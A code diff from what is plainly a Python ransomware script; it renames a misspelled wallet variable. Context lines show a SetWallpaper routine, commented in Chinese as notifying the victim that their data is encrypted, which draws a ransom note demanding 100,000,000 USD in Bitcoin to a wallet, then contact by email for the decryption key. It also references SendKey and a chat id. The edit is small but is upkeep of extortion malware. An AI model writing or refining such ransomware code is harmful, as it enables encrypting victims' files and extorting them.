@@ -29,7 +29,7 @@ g_chat_id = ""
 
 # 图片中的文本内容
 g_price = '100,000,000'
-g_wellt = '......test......'
+g_wallet = '......test......'
 g_email = 'test@test.com'
 
 
@@ -50,7 +50,7 @@ def SendKey(key_val):
 
 '''设置 Windows 的桌面壁纸，用于提醒对方，他的资料已经被加密了'''
 def SetWallpaper():
-	global g_price, g_wellt, g_email
+	global g_price, g_wallet, g_email
 
 	# 设置图片信息（像素大小和背景色）
 	img = Image.new('RGB', (GetSystemMetrics(0), GetSystemMetrics(1)), color = (0, 0, 0))
@@ -67,7 +67,7 @@ def SetWallpaper():
 			
 			In order to get your date back
 			> Send me {g_price} USD in BTC to my wallet:
-					{g_wellt}
+					{g_wallet}
 			> and then email me for your decryption key:
 					{g_email}
 			
